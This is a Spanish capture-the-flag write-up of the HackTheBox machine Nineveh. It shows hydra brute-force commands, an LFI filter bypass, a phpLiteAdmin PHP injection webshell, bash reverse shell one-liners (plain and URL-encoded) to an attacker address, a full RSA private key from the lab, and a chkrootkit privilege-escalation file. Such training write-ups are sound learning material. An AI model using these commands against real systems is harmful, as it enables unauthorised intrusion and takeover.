# Nineveh

![](../../../../~gitbook/image.md)Publicado: 03 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
### 📝 Descripción
Nineveh es una máquina Linux de dificultad media que presenta múltiples vectores de ataque interconectados. El camino hacia la compromisión total incluye:- 🔍 Enumeración web exhaustiva en puertos 80 y 443 con virtual hosting
- 🔐 Ataques de fuerza bruta contra paneles de autenticación
- 📁 Explotación de Local File Inclusion (LFI) para lectura de archivos del sistema
- 💉 Inyección de código PHP a través de phpLiteAdmin vulnerable
- 🔗 Combinación de vulnerabilidades (LFI + RCE) para obtener shell inicial
- 🗝️ Uso de claves SSH privadas extraídas mediante esteganografía
- ⚡ Escalada de privilegios aprovechando vulnerabilidad en chkrootkit
Esta máquina es excelente para practicar la cadena de exploits, donde cada vulnerabilidad individual no es suficiente por sí sola, pero su combinación permite la compromisión completa del sistema.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 HTTP (http://nineveh.htb/)
Al acceder al puerto 80 encontramos lo que parece ser un servidor apache en desarrollo, con un mensaje que indica que el contenido no ha sido añadido aún:![](../../../../~gitbook/image.md)🕷️Fuzzing de directoriosAl realizar fuzzing de directorios usando herramientas como feroxbuster, gobuster y dirsearch encontramos algunos recursos interesantes.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🔐 Panel de Login Departamental
Al acceder a http://nineveh.htb/department/files/ somos redirigidos a un panel de login.
Rápidamente nos percatamos de que al probar algunas credenciales genéricas el panel nos indica que el usuario `admin` existe porque cuando introducimos otro distinto nos indica lo contrario:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)También encontramos un comentario del administrador en el código fuente de la página:![](../../../../~gitbook/image.md)
#### 💥 Ataque de Fuerza Bruta
Tras descartar que una posible vulnerabilidad de tipo SQLi en el panel de login, optamos por la vía de intentar un ataque de fuerza bruta usando el usuario admin y el diccionario rockyou mediante http-post-form y la herramienta hydra:Transcurridos unos minutos obtenemos la contraseña del usuario admin:![](../../../../~gitbook/image.md)Al acceder con las credenciales obtenidas encontramos el siguiente mensaje:![](../../../../~gitbook/image.md)Revisamos el otro servicio expuesto en el puerto 443 por si estas referencias se refiriesen a dicho servicio.
#### 🗂️ Vulnerabilidad LFI (Local File Inclusion)
Merece la pena analizar si el parámetro notes es vulnerable a LFI. Aquí está la lista de payloads que probé:parámetro de notasMensaje de error`ninevehNotes.txt`Sin error, muestra nota`/etc/passwd`No se ha seleccionado ninguna nota.`../../../../../../../../../../etc/passwd`No se ha seleccionado ninguna nota.`ninevehNotes`Advertencia: include(files/ninevehNotes): no se pudo abrir el flujo: No existe el archivo o directorio en /var/www/html/department/manage.php en la línea 31`ninevehNote`No se ha seleccionado ninguna nota.`files/ninevehNotes/../../../../../../../../../etc/passwd`El nombre del archivo es demasiado largo.`files/ninevehNotes/../../../../../../../etc/passwd`El contenido de`/etc/passwd``/ninevehNotes/../etc/passwd`El contenido de`/etc/passwd`Parece estar comprobando que la frase `ninevehNotes` esté en el parámetro, o de lo contrario simplemente muestra “No Note is selected.”. Pero hay formas de evitar eso, ya sea simplemente eliminando la extensión y subiendo directorios, o comenzando en `/` y luego entrar en una carpeta inexistente `ninevehNotes` e inmediatamente retrocede con `../`.Cofirmamos el LFI con el siguiente payload:![](../../../../~gitbook/image.md)
#### 443 HTTP (https://nineveh.htb/)
![](../../../../~gitbook/image.md)A primera vista no hay gran cosa salvo esta imagen, realizamos fuzzing para ver si encontramos algo de utilidad.🕷️Fuzzing de directoriosRealizamos fuzzing de directorios con gobuster especificando la flag -k para omitir la comprobación del certificado:Encontramos un directorio /db y otro /secure-notes que merece la pena analizar:https://10.10.10.43/secure_notes/![](../../../../~gitbook/image.md)
#### 🖼️ Esteganografía en /secure-notes
Únicamente vemos una imagen, no hay tampoco nada en el código fuente, por lo que probablemente se esté usando esteganografía para ocultar algo en ella.Descargamos la imagen. En este caso no podemos usar steghide porque no es compatible con el formato .png. Pero podemos usar binwalk o incluso strings para ver si vemos algo:Aunque podemos usar `binwalk -e nineveh.png` en este caso con el comando strings ya conseguimos ver una clave privada RSA que pertenece al usuario amrois:El problema es que no tenemos ningún servicio SSH expuesto, por lo que esto ahora mismo todavía no nos sirve.
#### 💉 Explotación de phpLiteAdmin v1.9
Al acceder a https://nineveh.htb/db/ encontramos un panel de un servicio phpLiteAdmin del que además podemos enumerar la versión.![](../../../../~gitbook/image.md)
#### 🔨 Ataque de Fuerza Bruta
Esta versión del servicio presenta varias vulnerabilidades, pero requieren de estar autenticado. La única vía que nos queda es usar nuevamente hydra con este panel para ver si logramos encontrar la contraseña:con -l fake simplemente indicamos un usuario aunque en este caso es irrelevante, ya que no hay campo en el formulario para el usuario, pero la herramienta lo exige.![](../../../../~gitbook/image.md)
#### 🎯 Explotación de RCE
Buscamos exploits públicos para esta versión vulnerable de phplite. Uno de los más interesantes e el de Remote PHP Code Injection para obtener una RCE![](../../../../~gitbook/image.md)Ingresamos al panel de phpLiteAdmin y vemos que existe una única base de datos llamada test y no existen tablas:![](../../../../~gitbook/image.md)Los pasos que indica el exploit son los siguientes:1 Crear una nueva base de datos cuyo nombre termine en `.php`:![](../../../../~gitbook/image.md)2 A continuación, cambiamos a la nueva base de datos para crear una tabla con un campo de texto con un valor predeterminado de un webshell PHP básico:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
NOTA: Importante a la hora de usar la php shell usar `"` en el PHP, ya que  `'` está siendo utilizado por la base de datos para definir toda la cadena:![](../../../../~gitbook/image.md)
#### 🚀 Explotación Final - LFI + RCE
En este punto ya tenemos nueva web shell subida en la máquina, pero ahora no tenemos forma de desencadenar el ataque. ¿O sí? Recordemos el LFI descubierto en pasos anteriores:![](../../../../~gitbook/image.md)Ahora simplemente nos quedaría usar una bash shell one liner para ganar la RCE.Lo codificamos a URL:Iniciamos un listener con netcatLanzamos el payloadGanamos la RCE
#### 👤 Movimiento Lateral - Usuario amrois
Existe un directorio para el usuario amrois donde se ubica la flag pero no tenemos permisos:
#### 🗝️ Uso de la Clave SSH Privada
Tras unos minutos enumerando la máquina, descubrimos que hay un servicio ssh corriendo localmente en la máquina:Esto es interesante como una vía potencial de escalada, ya que recordemos que tenemos una clave rsa privada del usuario amrois, por lo que nos valdría con guardar dicha clave en un archivo en el directorio /tmp de la máquina, darle permisos y autenticarnos vía ssh como amrois y ya podemos obtener la primera flag:
#### 🚀 Escalada de Privilegios a Root
Tras un buen rato enumerando la máquina, descubrimos algo interesante. Hay un directorio en la raíz que no es usual llamado report:
#### 🕵️ Monitoreo de Procesos
En los archivos identificamos lo que podría ser un servicio para identificar rootkits porque hay referencias a /usr/bin/chkrootkit. Como sospecho que puede haber haber algún poceso en ejecución que lo esté lanzando cada periodo de tiempo, decido usar pspy o como alternativa usar el siguiente script para monitorizar procesos que se puedan estar ejecutando como root:![](../../../../~gitbook/image.md)Y efectivamente confirmamos que root está ejecutando periódicamente el comando
#### 🎯 Exploit de chkrootkit
Este servicio tiene una versión vulnerable para la cual existe un exploit para escalar privilegios![](../../../../~gitbook/image.md)El `txt`  indica que cualquier archivo en `$SLAPPER_FILES` se ejecutará debido a un error tipográfico debido a este bucle:Los pasos para llevar a cabo la explotación es crear un archivo llamado update en el directorio /tmp de la máquina introduciendo en él un comando malicioso, para que cuando sea ejecutando por la herramienta podamos escalar privilegiosIniciamos listenerCreamos el archivo malicioso en la ruta donde lo ejecutará chkrootkit y ganamos acceso como root.![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.10.43
PING 10.10.10.43 (10.10.10.43) 56(84) bytes of data.
64 bytes from 10.10.10.43: icmp_seq=1 ttl=63 time=46.6 ms
64 bytes from 10.10.10.43: icmp_seq=2 ttl=63 time=47.4 ms

--- 10.10.10.43 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1008ms
rtt min/avg/max/mdev = 46.584/46.972/47.360/0.388 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.43 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
80,443
```

```
❯ nmap -sC -sV -p$ports 10.10.10.43 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 17:03 CEST
Nmap scan report for 10.10.10.43
Host is up (0.048s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

```
echo "10.10.10.43 nineveh.htb " | sudo tee -a /etc/hosts
```

```
feroxbuster -u http://nineveh.htb -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml
```

```
dirsearch -u http://nineveh.htb/ -x 503
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form '/department/login.php:username=^USER^&password=^PASS^&rememberme=on:F=Invalid Password!'
```

```
- Have you fixed the login page yet! hardcoded username and password is really bad idea!
- check your serect folder to get in! figure it out! this is your challenge
- Improve the db interface.
~amrois
```

```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../etc/passwd
```

```
gobuster dir -e --url 10.10.10.43:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -k
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.43:443
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
https://10.10.10.43:443/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
https://10.10.10.43:443/server-status        (Status: 403) [Size: 300]
https://10.10.10.43:443/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

```
strings nineveh.png
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

```
hydra -l fake -P /usr/share/wordlists/rockyou.txt  -f nineveh.htb https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:F=Incorrect password."
```

```

```

```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../var/tmp/x3m1sec.php&cmd=id
```

```
bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'
```

```
%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%34%34%33%20%30%3e%26%31%27
```

```
nc -nlvp 443
```

```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../var/tmp/x3m1sec.php&cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%34%34%33%20%30%3e%26%31%27
```

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.43] 47186
bash: cannot set terminal process group (1383): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$
```

```
www-data@nineveh:/home/amrois$ ls -la
total 32
drwxr-xr-x 4 amrois amrois 4096 Dec 17  2020 .
drwxr-xr-x 3 root   root   4096 Jul  2  2017 ..
lrwxrwxrwx 1 root   root      9 Dec 17  2020 .bash_history -> /dev/null
-rw-r--r-- 1 amrois amrois  220 Jul  2  2017 .bash_logout
-rw-r--r-- 1 amrois amrois 3765 Jul  2  2017 .bashrc
drwx------ 2 amrois amrois 4096 Jul  3  2017 .cache
-rw-r--r-- 1 amrois amrois  655 Jul  2  2017 .profile
drwxr-xr-x 2 amrois amrois 4096 Jul  2  2017 .ssh
-rw------- 1 amrois amrois   33 Jun  3 09:58 user.txt
www-data@nineveh:/home/amrois$ cat user.txt
cat: user.txt: Permission denied
```

```
ss -tulnp
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
tcp    LISTEN     0      128       *:80                    *:*
tcp    LISTEN     0      128       *:22                    *:*
tcp    LISTEN     0      128       *:443                   *:*
tcp    LISTEN     0      128      :::22                   :::*
```

```
cd /tmp
nano id_rsa

chmod 600 id_rsa
```

```
ssh -id id_rsa amrois@localhostç
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.

You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
```

```
amrois@nineveh:/report$ ls
report-25-06-03:12:20.txt  report-25-06-03:12:22.txt
report-25-06-03:12:21.txt  report-25-06-03:12:23.txt
```

```
## Script para detectar nuevos procesos (o procesos que han terminado) comparando periódicamente el listado de procesos.

# !/bin/bash

old_process="$(ps -eo user,command)"

while true; do
new_process="$(ps -eo user,command)"
diff \
```
/bin/sh /usr/bin/chkrootkit
```

```
searchsploit chkrootkit
```

```
for i in ${SLAPPER_FILES}; do
if [ -f ${i} ]; then
file_port=$file_port $i
STATUS=1
fi
```

```
nc -nlvp 443
```

```
cd /tmp
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.3/443 0>&1' > update
chmod +x update
```
